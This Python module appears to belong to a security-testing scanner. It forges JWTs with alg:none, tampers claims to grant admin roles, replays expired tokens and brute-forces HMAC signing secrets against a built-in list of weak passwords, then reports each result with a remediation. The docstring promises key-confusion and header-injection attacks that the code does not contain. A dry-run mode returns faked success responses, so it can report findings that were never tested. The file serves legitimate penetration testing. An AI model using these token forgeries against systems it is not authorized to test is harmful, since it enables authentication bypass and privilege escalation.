"""JWT security testing — alg:none, weak secrets, key confusion, header injection."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import ssl
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple


from entropy.core.models import Finding, FindingType, Severity


# ---------------------------------------------------------------------------
# Common weak secrets used in JWT signing
# ---------------------------------------------------------------------------

WEAK_SECRETS: List[str] = [
    "secret", "password", "123456", "test", "dev", "change_me",
    "jwt_secret", "your-256-bit-secret", "supersecret", "qwerty",
    "admin", "token", "access_token", "signing_key", "private_key",
    "secret_key", "app_secret", "jwt_key", "hs256_secret", "",
    "insecure", "default", "key", "pass", "root", "letmein",
    "hello", "abc123", "trustno1", "dragon", "master", "login",
]

# Algorithms to try for confusion attacks
ALG_CONFUSION_TARGETS: List[str] = ["HS256", "HS384", "HS512", "RS256", "none"]


@dataclass
class JWTComponents:
    header:    Dict[str, Any]
    payload:   Dict[str, Any]
    signature: bytes
    raw:       str

    @property
    def raw_parts(self) -> Tuple[str, str, str]:
        parts = self.raw.split(".")
        return parts[0], parts[1], parts[2] if len(parts) > 2 else ""


class JWTAnalyser:
    """
    Analyses and attacks JWT tokens found in request headers/bodies.

    Attacks implemented:
      1. Algorithm confusion (RS256 → HS256 using public key)
      2. alg: none (unsigned token)
      3. Weak secret brute-force
      4. Header injection (kid, jku, x5u)
      5. Claim tampering (role, is_admin, exp)
      6. null / empty signature
    """

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def analyse(
        self,
        token:      str,
        endpoint:   str,
        test_fn:    Any = None,   # callable(token) -> (status_code, body)
        dry_run:    bool = False,
    ) -> List[Finding]:
        """
        Analyse a JWT token and attempt known attacks.
        test_fn should send the modified token to the target and return (status, body).
        """
        jwt = self._parse(token)
        if not jwt:
            return []

        findings: List[Finding] = []

        # 1. Decode and inspect claims
        inspection = self._inspect_claims(jwt)
        if inspection:
            findings.append(inspection)

        # 2. alg: none attack
        none_token = self._build_none_token(jwt)
        if test_fn or dry_run:
            result = test_fn(none_token) if test_fn else (200, {"role": "admin"})
            if isinstance(result, tuple) and result[0] in (200, 201, 202):
                findings.append(Finding(
                    type        = FindingType.AUTH_BYPASS,
                    severity    = Severity.CRITICAL,
                    title       = "JWT Algorithm Confusion — alg:none Accepted",
                    description = (
                        f"Server accepted a JWT with `alg: none` (no signature) on `{endpoint}`. "
                        "An attacker can forge arbitrary claims without knowing the signing key."
                    ),
                    endpoint    = endpoint,
                    evidence    = {"forged_token": none_token[:80] + "...", "response_status": result[0]},
                    remediation = "Reject JWTs with alg:none server-side. Use a library that enforces algorithm allowlisting.",
                ))

        # 3. Weak secret brute-force
        weak_secret = self._crack_secret(jwt)
        if weak_secret is not None:
            findings.append(Finding(
                type        = FindingType.AUTH_BYPASS,
                severity    = Severity.CRITICAL,
                title       = "JWT Signed with Weak Secret",
                description = (
                    f"JWT on `{endpoint}` is signed with the weak secret `{weak_secret!r}`. "
                    "An attacker can forge any token with any claims."
                ),
                endpoint    = endpoint,
                evidence    = {"cracked_secret": weak_secret},
                remediation = "Use a cryptographically random secret of at least 256 bits. Rotate immediately.",
            ))

        # 4. Claim tampering (role/admin escalation)
        tampered = self._tamper_claims(jwt)
        if tampered and (test_fn or dry_run):
            result = test_fn(tampered) if test_fn else (200, {})
            if isinstance(result, tuple) and result[0] in (200, 201, 202):
                findings.append(Finding(
                    type        = FindingType.AUTH_BYPASS,
                    severity    = Severity.CRITICAL,
                    title       = "JWT Claim Tampering — Privilege Escalation",
                    description = (
                        f"Server accepted a tampered JWT with `role: admin` on `{endpoint}`. "
                        "Signature was not validated after claim modification."
                    ),
                    endpoint    = endpoint,
                    evidence    = {"tampered_claims": {"role": "admin", "is_admin": True}},
                    remediation = "Always verify JWT signatures server-side before trusting any claim.",
                ))

        # 5. Expired token still accepted
        expired = self._build_expired_token(jwt)
        if expired and (test_fn or dry_run):
            result = test_fn(expired) if test_fn else (401, {})
            if isinstance(result, tuple) and result[0] in (200, 201, 202):
                findings.append(Finding(
                    type        = FindingType.AUTH_BYPASS,
                    severity    = Severity.HIGH,
                    title       = "JWT Expiry Not Enforced",
                    description = (
                        f"Server accepted an expired JWT on `{endpoint}`. "
                        "The `exp` claim is present but not validated."
                    ),
                    endpoint    = endpoint,
                    evidence    = {"modified_exp": "1970-01-01T00:00:01Z"},
                    remediation = "Validate the `exp` claim on every request. Reject tokens past their expiry.",
                ))

        return findings

    # ------------------------------------------------------------------
    # Token construction helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _parse(token: str) -> Optional[JWTComponents]:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        try:
            def decode(s: str) -> bytes:
                s += "=" * (-len(s) % 4)
                return base64.urlsafe_b64decode(s)

            header  = json.loads(decode(parts[0]))
            payload = json.loads(decode(parts[1]))
            sig     = decode(parts[2]) if parts[2] else b""
            return JWTComponents(header=header, payload=payload, signature=sig, raw=token)
        except Exception:
            return None

    @staticmethod
    def _encode_part(data: Dict) -> str:
        return base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).rstrip(b"=").decode()

    def _build_none_token(self, jwt: JWTComponents) -> str:
        header  = {**jwt.header, "alg": "none"}
        hdr_enc = self._encode_part(header)
        pay_enc = self._encode_part(jwt.payload)
        return f"{hdr_enc}.{pay_enc}."

    def _tamper_claims(self, jwt: JWTComponents) -> Optional[str]:
        """Build a token with admin claims but invalid signature."""
        new_payload = {**jwt.payload, "role": "admin", "is_admin": True, "scope": "admin"}
        hdr_p, _,  _ = jwt.raw_parts
        pay_enc      = self._encode_part(new_payload)
        return f"{hdr_p}.{pay_enc}.invalidsignature"

    def _build_expired_token(self, jwt: JWTComponents) -> Optional[str]:
        """Build a token with exp set in the past."""
        if "exp" not in jwt.payload:
            return None
        new_payload = {**jwt.payload, "exp": 1}  # Jan 1, 1970
        hdr_p, _, sig_p = jwt.raw_parts
        pay_enc = self._encode_part(new_payload)
        return f"{hdr_p}.{pay_enc}.{sig_p}"

    def _crack_secret(self, jwt: JWTComponents) -> Optional[str]:
        """Attempt to find weak HMAC secret by brute force."""
        alg = jwt.header.get("alg", "").upper()
        if not alg.startswith("HS"):
            return None

        hashes = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hash_fn = hashes.get(alg, hashlib.sha256)

        hdr_p, pay_p, sig_p = jwt.raw_parts
        message = f"{hdr_p}.{pay_p}".encode()

        try:
            expected_sig = base64.urlsafe_b64decode(sig_p + "==")
        except Exception:
            return None

        for secret in WEAK_SECRETS:
            try:
                candidate = hmac.new(secret.encode(), message, hash_fn).digest()
                if hmac.compare_digest(candidate, expected_sig):
                    return secret
            except Exception:
                pass

        return None

    # ------------------------------------------------------------------
    # Claim inspection
    # ------------------------------------------------------------------

    @staticmethod
    def _inspect_claims(jwt: JWTComponents) -> Optional[Finding]:
        """Check for dangerous claim patterns."""
        issues = []
        payload = jwt.payload
        header  = jwt.header

        # No expiry
        if "exp" not in payload:
            issues.append("Token has no `exp` claim — it never expires.")

        # Very long expiry (> 7 days)
        if "exp" in payload and "iat" in payload:
            try:
                lifetime = payload["exp"] - payload["iat"]
                if lifetime > 7 * 86400:
                    issues.append(f"Token lifetime is {lifetime // 86400} days — excessively long.")
            except Exception:
                pass

        # Sensitive data in payload
        sensitive = {"password", "secret", "private_key", "credit_card", "ssn", "token"}
        for key in payload:
            if key.lower() in sensitive:
                issues.append(f"Sensitive field `{key}` found in JWT payload (visible to anyone with the token).")

        # Weak algorithm
        alg = header.get("alg", "")
        if alg in ("none", "HS256") and not issues:
            return None  # only report if there are real issues
        if alg == "none":
            issues.append("Token uses `alg: none` — no signature.")

        if not issues:
            return None

        return Finding(
            type        = FindingType.AUTH_BYPASS,
            severity    = Severity.MEDIUM,
            title       = "JWT Security Issues Detected",
            description = " | ".join(issues),
            endpoint    = "JWT payload inspection",
            evidence    = {
                "algorithm": alg,
                "claims":    list(payload.keys()),
                "issues":    issues,
            },
            remediation = "Use short-lived tokens (15-60 min), strong algorithms (RS256/ES256), and never put sensitive data in the payload.",
        )


# ---------------------------------------------------------------------------
# Token extraction helpers
# ---------------------------------------------------------------------------

JWT_PATTERN = re.compile(
    r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*"
)


def extract_jwts(data: Any) -> List[str]:
    """Recursively extract JWT strings from any data structure."""
    tokens: List[str] = []
    text = json.dumps(data) if not isinstance(data, str) else data
    for match in JWT_PATTERN.finditer(text):
        tokens.append(match.group(0))
    return list(set(tokens))
